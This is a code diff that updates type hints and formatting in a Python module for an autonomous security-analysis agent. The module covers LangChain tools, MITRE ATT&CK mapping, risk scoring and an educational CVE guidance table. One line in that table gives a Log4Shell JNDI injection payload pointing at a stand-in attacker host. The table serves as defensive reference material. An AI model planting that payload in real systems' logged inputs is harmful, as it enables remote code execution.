@@ -12,11 +12,12 @@ Tools available to the agent:
 When OPENAI_API_KEY is present, uses LangChain AgentExecutor (ReAct pattern).
 Falls back to a deterministic multi-step pipeline when no LLM key is available.
 """
+
 from __future__ import annotations
 
 import logging
 import os
-from typing import Any, Dict, List, Optional
+from typing import Any
 
 from .mitre_attack import map_multiple
 from .rag_store import retrieve_guidance
@@ -28,7 +29,7 @@ logger = logging.getLogger(__name__)
 # CVE exploit guidance knowledge base (educational, no working PoC code)
 # ---------------------------------------------------------------------------
 
-_CVE_GUIDANCE: Dict[str, Dict[str, str]] = {
+_CVE_GUIDANCE: dict[str, dict[str, str]] = {
     "cve-2021-44228": {
         "name": "Log4Shell",
         "technique": "JNDI injection — ${jndi:ldap://attacker.com/a} in any logged field",
@@ -74,7 +75,7 @@ _CVE_GUIDANCE: Dict[str, Dict[str, str]] = {
 }
 
 
-def get_exploit_guidance(identifier: str) -> Dict[str, Any]:
+def get_exploit_guidance(identifier: str) -> dict[str, Any]:
     """
     Retrieve educational guidance for a CVE or vulnerability name.
 
@@ -104,11 +105,7 @@ def get_exploit_guidance(identifier: str) -> Dict[str, Any]:
 
     # Fuzzy name match
     for cve_id, data in _CVE_GUIDANCE.items():
-        if (
-            data["name"].lower() in key
-            or key in data["name"].lower()
-            or cve_id in key
-        ):
+        if data["name"].lower() in key or key in data["name"].lower() or cve_id in key:
             return {
                 "identifier": identifier,
                 "vulnerability": data["name"],
@@ -117,8 +114,7 @@ def get_exploit_guidance(identifier: str) -> Dict[str, Any]:
                 "remediation": data["patch"],
                 "severity": data["severity"],
                 "disclaimer": (
-                    "For defensive/educational use only. "
-                    "Do not test without written authorisation."
+                    "For defensive/educational use only. Do not test without written authorisation."
                 ),
                 "source": "internal_kb",
             }
@@ -146,14 +142,16 @@ _OPENAI_AVAILABLE = False
 
 try:
     from langchain.agents import AgentExecutor, create_react_agent  # type: ignore[import-not-found]
-    from langchain.tools import Tool  # type: ignore[import-not-found]
     from langchain.prompts import PromptTemplate  # type: ignore[import-not-found]
+    from langchain.tools import Tool  # type: ignore[import-not-found]
+
     _LANGCHAIN_AVAILABLE = True
 except Exception:
     pass
 
 try:
     from langchain_openai import ChatOpenAI  # type: ignore[import-not-found]
+
     _OPENAI_AVAILABLE = True
 except Exception:
     pass
@@ -180,7 +178,7 @@ Question: {input}
 {agent_scratchpad}"""
 
 
-def _build_agent_tools() -> List[Any]:
+def _build_agent_tools() -> list[Any]:
     """Build LangChain Tool list for the autonomous agent."""
     if not _LANGCHAIN_AVAILABLE:
         return []
@@ -204,7 +202,9 @@ def _build_agent_tools() -> List[Any]:
         critical = sum(1 for f in findings if "critical" in f.lower())
         high = sum(1 for f in findings if "high" in f.lower())
         score = min(100, critical * 35 + high * 20 + len(findings) * 5)
-        return f"Risk score: {score}/100. Critical: {critical}, High: {high}, Total: {len(findings)}."
+        return (
+            f"Risk score: {score}/100. Critical: {critical}, High: {high}, Total: {len(findings)}."
+        )
 
     def _exploit_tool(cve_id: str) -> str:
         guidance = get_exploit_guidance(cve_id.strip())
@@ -217,18 +217,30 @@ def _build_agent_tools() -> List[Any]:
         )
 
     return [
-        Tool(name="query_knowledge_base", func=_kb_tool,
-             description="Search security knowledge base. Input: free-text security question."),
-        Tool(name="map_mitre_attack", func=_mitre_tool,
-             description="Map findings to MITRE ATT&CK. Input: comma-separated finding titles."),
-        Tool(name="analyze_risk", func=_risk_tool,
-             description="Compute risk score. Input: comma-separated finding descriptions."),
-        Tool(name="get_exploit_guidance", func=_exploit_tool,
-             description="Get educational CVE guidance. Input: CVE-ID or vulnerability name."),
+        Tool(
+            name="query_knowledge_base",
+            func=_kb_tool,
+            description="Search security knowledge base. Input: free-text security question.",
+        ),
+        Tool(
+            name="map_mitre_attack",
+            func=_mitre_tool,
+            description="Map findings to MITRE ATT&CK. Input: comma-separated finding titles.",
+        ),
+        Tool(
+            name="analyze_risk",
+            func=_risk_tool,
+            description="Compute risk score. Input: comma-separated finding descriptions.",
+        ),
+        Tool(
+            name="get_exploit_guidance",
+            func=_exploit_tool,
+            description="Get educational CVE guidance. Input: CVE-ID or vulnerability name.",
+        ),
     ]
 
 
-def _build_langchain_agent() -> Optional[Any]:
+def _build_langchain_agent() -> Any | None:
     """Build LangChain ReAct AgentExecutor; returns None if unavailable."""
     api_key = os.getenv("OPENAI_API_KEY")
     if not api_key or not _LANGCHAIN_AVAILABLE or not _OPENAI_AVAILABLE:
@@ -255,11 +267,12 @@ def _build_langchain_agent() -> Optional[Any]:
 # Deterministic fallback pipeline
 # ---------------------------------------------------------------------------
 
+
 def _deterministic_pipeline(
     target: str,
-    findings: List[str],
-    query: Optional[str],
-) -> Dict[str, Any]:
+    findings: list[str],
+    query: str | None,
+) -> dict[str, Any]:
     """
     Multi-step deterministic analysis when LLM is unavailable.
 
@@ -299,7 +312,12 @@ def _deterministic_pipeline(
     return {
         "target": target,
         "analysis_mode": "autonomous_deterministic_pipeline",
-        "steps_executed": ["kb_retrieval", "mitre_mapping", "risk_scoring", "recommendation_synthesis"],
+        "steps_executed": [
+            "kb_retrieval",
+            "mitre_mapping",
+            "risk_scoring",
+            "recommendation_synthesis",
+        ],
         "risk_score": risk_score,
         "mitre_techniques": unique_techniques,
         "mitre_tactics": unique_tactics,
@@ -313,11 +331,12 @@ def _deterministic_pipeline(
 # Public entry point
 # ---------------------------------------------------------------------------
 
+
 def run_autonomous_agent(
     target: str,
-    findings: List[str],
-    query: Optional[str] = None,
-) -> Dict[str, Any]:
+    findings: list[str],
+    query: str | None = None,
+) -> dict[str, Any]:
     """
     Run the autonomous multi-step security analysis agent.
 
@@ -335,7 +354,9 @@ def run_autonomous_agent(
     agent = _build_langchain_agent()
     if agent is not None:
         try:
-            input_str = query or f"Analyse security findings for {target}: {', '.join(findings[:5])}"
+            input_str = (
+                query or f"Analyse security findings for {target}: {', '.join(findings[:5])}"
+            )
             result = agent.invoke(
                 {
                     "target": target,
@@ -352,6 +373,8 @@ def run_autonomous_agent(
                 "kb_sources": "chromadb+openai",
             }
         except Exception as exc:
-            logger.warning("LangChain agent invocation failed, using deterministic fallback: %s", exc)
+            logger.warning(
+                "LangChain agent invocation failed, using deterministic fallback: %s", exc
+            )
 
     return _deterministic_pipeline(target, findings, query)
